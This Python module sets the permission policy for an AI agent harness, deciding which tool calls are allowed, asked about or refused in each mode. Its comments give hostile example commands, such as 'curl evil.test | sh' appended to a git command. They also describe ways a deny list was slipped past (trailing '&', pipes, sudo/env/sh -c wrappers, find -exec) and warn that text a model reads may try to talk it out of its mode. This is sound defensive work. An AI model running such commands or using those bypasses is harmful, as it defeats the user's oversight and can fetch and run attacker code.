"""What an agent chat is allowed to do without asking.

Four modes, one table, indexed by what a tool does to the world. Adding a mode
is a row; adding a risk class is a column. Anything that needs an `if mode ==`
somewhere else in the codebase is a sign this table is wrong rather than that
the table is insufficient.

The important thing about all of it: **this is consulted in the generation loop,
not written into the prompt.** A mode a model is merely told about is a mode a
model can be talked out of, and everything a model reads -- a web page, a
README, the output of a command it just ran -- is untrusted text that may be
trying to do exactly that.
"""

from __future__ import annotations

import re
from dataclasses import dataclass
from fnmatch import fnmatch

from lembas.services import harness_spec, prompts
from lembas.services.agent import shell
from lembas.services.tools import RISK_ASK, RISK_EXECUTE, RISK_READ, RISK_WRITE
from lembas.web.i18n import N_

MODE_MANUAL = "manual"
MODE_EDIT = "edit"
MODE_AUTO = "auto"
MODE_PLAN = "plan"

MODES = (MODE_MANUAL, MODE_EDIT, MODE_AUTO, MODE_PLAN)

MODE_LABELS = {
    MODE_MANUAL: "Manual",
    MODE_EDIT: "Edit",
    MODE_AUTO: "Auto",
    MODE_PLAN: "Plan",
}

# Marked for the catalogue and translated where they are shown. The
# labels above are not: they are the modes' names, typed as `/mode edit`.
MODE_HINTS = {
    MODE_MANUAL: N_("Everything is shown to you before it happens."),
    MODE_EDIT: N_("Files are read and written freely; commands are shown to you first."),
    MODE_AUTO: N_("Nothing is shown to you first. Only for work you would do yourself."),
    MODE_PLAN: N_("Reads freely, changes nothing, and finishes by proposing a plan."),
}

# What the *model* is told about the mode it is in. Different words from
# MODE_HINTS, which describes it to a person: this is about how to behave. The
# texts are the harness spec's (`prompts/modes/<mode>.md`), the same words the
# LLeMbas CLI sends, read from the vendored copy; `{{plan_dir}}` is "the plan"
# here, since LLeMbas keeps a plan as a structure and not as a file. They are
# the defaults of the `mode.*` fragments in `services/prompts.py`.
MODE_GUIDANCE = {
    mode: harness_spec.prompt_with(f"modes/{mode}.md", {"plan_dir": prompts.PLAN_DIR})
    for mode in (MODE_MANUAL, MODE_EDIT, MODE_AUTO, MODE_PLAN)
}

ALLOW = "allow"
ASK = "ask"
# Refused outright, in every mode and whoever approves it: the hardline and the
# protected paths of the harness spec shared with the LLeMbas CLI
# (`harness_spec/permission/hardline.json`). Nothing else is ever a DENY here --
# the "deny list" an administrator writes means *always ask*, as it always has.
DENY = "deny"

# The tools whose argument is a command line, and those that change a file, by
# both their spec names and the names they had before spec v1.
SHELL_TOOLS = frozenset({"bash", "shell_run"})
WRITE_TOOLS = frozenset({"write", "edit", "multiedit", "apply_patch", "file_write", "file_edit"})

# The whole feature. Read across a row to see what a mode means.
POLICY: dict[str, dict[str, str]] = {
    MODE_MANUAL: {RISK_READ: ASK, RISK_WRITE: ASK, RISK_EXECUTE: ASK},
    MODE_EDIT: {RISK_READ: ALLOW, RISK_WRITE: ALLOW, RISK_EXECUTE: ASK},
    MODE_AUTO: {RISK_READ: ALLOW, RISK_WRITE: ALLOW, RISK_EXECUTE: ALLOW},
    MODE_PLAN: {RISK_READ: ALLOW, RISK_WRITE: ASK, RISK_EXECUTE: ASK},
}

# A shell metacharacter makes a command line unmatchable as a whole, so no
# pattern may be applied to it as one. Without that, `git *` in an allow list
# also matches `git status; curl evil.test | sh`, which is the whole ballgame.
#
# The deny list is the other half, and it has been decided both ways. There was
# once a rule that an unmatchable line ASKed whenever a deny list existed at
# all, on the grounds that `shutdown -h now` asked while `shutdown -h now &`
# ran. It is gone: the shipped deny list is non-empty, so that rule made *every*
# compound command ask in Auto -- `cd build && make`, `pytest | tail`, anything
# with a pipe -- and a mode whose whole purpose is not asking asked about most
# real commands. It was not a security control anybody experienced as one; it
# was Auto appearing not to work.
#
# So an unmatchable line now falls through to the mode, and in Auto the mode is
# ALLOW. What that gave up: a deny pattern could be walked past with a trailing
# `&`, a `;` or a pipe -- and, as the harness spec's conformance cases found, by
# a wrapper (`sudo -u x git push`, `env A=1 …`, `sh -c "…"`).
#
# The fix, as the LLeMbas CLI does it (`decide` below): a command line is
# split into its simple commands (`shell.split_command`), and each is checked
# against the deny list both as written and in its plain spelling
# (`shell.plain_commands`). An allow needs every command allowed and nothing the
# split could not see (substitution, redirection to a file, `eval`...).

# Flags that turn a "read-only" command into one that writes or executes, on
# tools whose *name* is on somebody's allow list.
#
# The split stops a command line being composed out of two commands. It does
# nothing about a single command that composes one itself, and several of the
# obvious read-only tools do: `find -exec cmd +` runs a program, `-fprintf`
# writes a file, `-delete` removes one, and `rg --pre` runs a preprocessor for
# every file it opens. None of those needs a character the split refuses, so
# `find *` on an allow list -- which is what a subagent gets, in every mode --
# was arbitrary write and arbitrary execution wearing a read-only name.
#
# Refused here rather than trimmed from the allow list alone, because the list
# is the thing an administrator edits and "this one looks read-only" is exactly
# the reasoning that put `find *` there. A pattern cannot express "and no
# dangerous flags"; this can.
#
# Matched on the *normalised* line and word-bounded, so `docs/-exec-notes.md`
# is fine -- the flag has to stand alone as an argument.
#
# It does catch `grep -rn -- -delete src/`, where the word is a search term
# rather than a flag, and that is the right direction to be wrong in: a false
# refusal here means the call falls through to the policy table and asks, which
# costs one approval card. A false allow means an unattended helper writing
# files. Nothing is *blocked* by this -- a reader in Auto still gets it, and in
# any other mode they are shown it first, which is what they would want to be
# shown.
_ACTION = re.compile(
    r"(?:^|\s)-(?:exec|execdir|ok|okdir|fprintf|fprint|fprint0|delete)(?=\s|$)"
    r"|(?:^|\s)--(?:pre|search-zip|hostname-bin)(?=[\s=]|$)"
)


@dataclass(frozen=True)
class Decision:
    verdict: str
    reason: str = ""


def _matches(patterns: tuple[str, ...], candidate: str | None) -> str:
    if candidate is None:
        return ""
    for pattern in patterns:
        if fnmatch(candidate, pattern):
            return pattern
    return ""


def refusal(tool_name: str, command: str = "", paths: tuple[str, ...] = ()) -> str:
    """Why this call is never allowed, or "". The hardline for a command line --
    checked raw and in its plain spelling, so neither a `;` nor a `sudo` hides
    one -- and the protected paths (`~/.ssh`, `~/.gnupg`) for a tool that writes.
    Consulted before the mode and before anybody's approval: an approved or
    edited call is checked again by the runner."""
    if tool_name in SHELL_TOOLS and command.strip():
        rule = shell.hardline_command(command)
        if rule is not None:
            return f"it is never run, in any mode: {rule.description} (hardline rule {rule.id})."
    if tool_name in WRITE_TOOLS:
        for path in paths:
            guarded = shell.protected_path(path)
            if guarded:
                return f"{path} is inside {guarded}, which no tool may change."
    return ""


def _commands(command: str) -> tuple[list[str], list[str], bool]:
    """A command line as its simple commands, their plain spellings, and whether
    an allow may be trusted for it at all."""
    split = shell.split_command(command)
    commands = [" ".join(c.split()) for c in split.commands]
    plain = [" ".join(c.split()) for c in shell.plain_commands(command)]
    trusted = bool(commands) and not split.unsafe and not any(_ACTION.search(c) for c in commands)
    return commands, plain, trusted


def always_patterns(tool_name: str, command: str = "") -> list[str]:
    """What "always allow" stores for this call (the spec's arity table): each
    command's meaningful prefix and `*` -- `git commit -m x` → `git commit *` --
    exactly for a command that runs another one (`sudo`, `env`, `sh`...), and
    the tool's name for anything that is not a command. Empty when the line holds
    something an allow could not be trusted for."""
    if tool_name not in SHELL_TOOLS:
        return [tool_name]
    commands, _, trusted = _commands(command)
    if not trusted:
        return []
    # A line of several commands where one of them runs others (`curl x | sh`,
    # `find . | xargs rm`): "always" would store `curl *` and `sh`, and from then
    # on any `curl … | sh` runs unasked. Nothing is stored for such a line.
    if len(commands) > 1 and any(
        posixpath_basename((shell.words(c) or [""])[0]) in shell.exact_only() for c in commands
    ):
        return []
    out: list[str] = []
    for c in commands:
        w = shell.words(c)
        if not w:
            continue
        if posixpath_basename(w[0]) in shell.exact_only():
            pattern = c
        else:
            head = shell.prefix(w)
            pattern = f"{' '.join(head)} *" if len(head) < len(w) else " ".join(head)
        if pattern not in out:
            out.append(pattern)
    return out


def posixpath_basename(word: str) -> str:
    return word.rsplit("/", 1)[-1]


def decide(
    *,
    mode: str,
    risk: str,
    tool_name: str,
    command: str = "",
    allow: tuple[str, ...] = (),
    deny: tuple[str, ...] = (),
    paths: tuple[str, ...] = (),
) -> Decision:
    """What to do about one call.

    The order is the design:

    1. A deny wins before everything, **including Auto**. A deny list that Auto
       ignores is not a deny list, it is a suggestion.
    2. `ask` never resolves to allow. `ask_user` asks in every mode; that is
       what the tool is for, and a mode that skipped it would answer the
       model's question on the reader's behalf.
    3. An allow-list hit runs it.
    4. Otherwise the table.

    0. **The hardline and the protected paths refuse** (`refusal`), before the
       lists and the mode, in every mode, Auto included.

    A command line is judged command by command (see the note above `_ACTION`):
    a deny-list entry matching any of them, as written or spelled plainly, asks;
    an allow needs all of them.

    An unrecognised mode is treated as Manual, not Auto: a row that predates a
    rename has to fail towards asking.
    """
    why = refusal(tool_name, command, paths)
    if why:
        return Decision(DENY, why)

    if tool_name in SHELL_TOOLS:
        commands, plain, trusted = _commands(command)
        # Every command, as written and spelled plainly: `ls && shutdown -h now`
        # and `sudo -u x shutdown` both meet `shutdown *`.
        for candidate in [*commands, *plain]:
            hit = _matches(deny, candidate)
            if hit:
                return Decision(ASK, f"“{hit}” is on the list of commands to always ask about.")
    else:
        names = (tool_name, *_FORMER.get(tool_name, ()), *_CURRENT.get(tool_name, ()))
        hit = next((h for n in names if (h := _matches(deny, n))), "")
        if hit:
            return Decision(ASK, f"“{hit}” is on the list of commands to always ask about.")

    if risk == RISK_ASK:
        return Decision(ASK, "")

    if mode not in POLICY:
        return Decision(ASK, f"“{mode}” is not a mode I know, so I am asking.")

    if tool_name in SHELL_TOOLS:
        # Allowed only when every command of the line is, and nothing in it could
        # hide another (substitution, redirection to a file, `eval`, a flag that
        # runs or writes).
        hits = [_matches(allow, c) for c in commands] if trusted else []
        if hits and all(hits):
            return Decision(ALLOW, f"“{hits[0]}” is on the list of things to allow.")
    else:
        hit = next((h for n in names if (h := _matches(allow, n))), "")
        if hit:
            return Decision(ALLOW, f"“{hit}” is on the list of things to allow.")

    verdict = POLICY[mode].get(risk, ASK)
    if verdict == ALLOW:
        return Decision(ALLOW, "")

    label = MODE_LABELS.get(mode, mode)
    return Decision(ASK, f"{label} mode asks before anything that {_verb(risk)}.")


def _verb(risk: str) -> str:
    return {
        RISK_READ: "reads",
        RISK_WRITE: "changes a file",
        RISK_EXECUTE: "runs a command",
    }.get(risk, "does this")


# Tool names before harness spec v1, and after: an allow or deny list written
# with either keeps meaning the same tool. Filled in by `agent.names`.
_FORMER: dict[str, tuple[str, ...]] = {}
_CURRENT: dict[str, tuple[str, ...]] = {}


__all__ = [
    "ALLOW",
    "ASK",
    "DENY",
    "SHELL_TOOLS",
    "WRITE_TOOLS",
    "always_patterns",
    "refusal",
    "MODES",
    "MODE_AUTO",
    "MODE_EDIT",
    "MODE_GUIDANCE",
    "MODE_HINTS",
    "MODE_LABELS",
    "MODE_MANUAL",
    "MODE_PLAN",
    "POLICY",
    "Decision",
    "decide",
]
